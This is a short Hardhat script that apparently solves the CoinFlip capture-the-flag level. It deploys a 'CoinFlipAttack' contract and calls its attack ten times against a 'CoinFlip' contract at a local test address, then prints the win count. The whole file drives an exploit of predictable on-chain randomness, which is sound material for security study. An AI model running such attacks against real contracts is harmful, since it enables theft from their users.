const {ethers} = require('hardhat');

const CTRT_ADDR = "0x94099942864EA81cCF197E9D71ac53310b1468D8";
const PLAYER_ADDR = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"

async function main() {
  const player = await ethers.getSigner(PLAYER_ADDR);
  const contract = await ethers.getContractAt("CoinFlip", CTRT_ADDR, player);

  console.log("--[1] deploy attacker contract");
  const Attack = await ethers.getContractFactory("CoinFlipAttack");
  const attack = await Attack.deploy();
  await attack.deployed();


  let cnt = 0;

  for(cnt = 0; cnt < 10; cnt++) {
    await attack.attack(CTRT_ADDR)
  }

  console.log("--[2] check")
  console.log(await contract.consecutiveWins());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
